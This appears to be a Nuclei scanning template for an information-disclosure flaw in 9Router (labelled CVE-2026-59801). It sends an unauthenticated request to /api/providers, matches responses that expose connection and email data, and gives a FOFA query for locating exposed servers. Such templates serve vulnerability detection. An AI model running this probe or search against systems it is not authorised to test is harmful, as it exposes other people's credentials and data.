id: 9router-providers-disclosure
info:
  name: 9Router-CVE-2026-59801
  author: leadlife
  severity: high
  description: 9Router-CVE-2026-59801-信息泄露，导致数据信息泄露或者导致服务器被控制。
  reference: 
    - https://github.com/SourByte05/Vulnerability-Wiki-PoC/blob/main/2026/07/9Router-CVE-2026-59801-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/9Router-CVE-2026-59801-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2.md
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: port="20128" || title="9Router"
    tips:
    repair:
    version:
  tags: disclosure,9router

http:
  - raw:
      - |
        GET /api/providers HTTP/1.1
        Host: {{Hostname}}
        Connection: keep-alive
        sec-ch-ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"
        sec-ch-ua-mobile: ?0
        sec-ch-ua-platform: "Windows"
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Sec-Fetch-Site: none
        Sec-Fetch-Mode: navigate
        Sec-Fetch-User: ?1
        Sec-Fetch-Dest: document
        Accept-Encoding: gzip, deflate, br, zstd
        Accept-Language: zh-CN,zh;q=0.9


    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'connections','email','updateAt')
        condition: and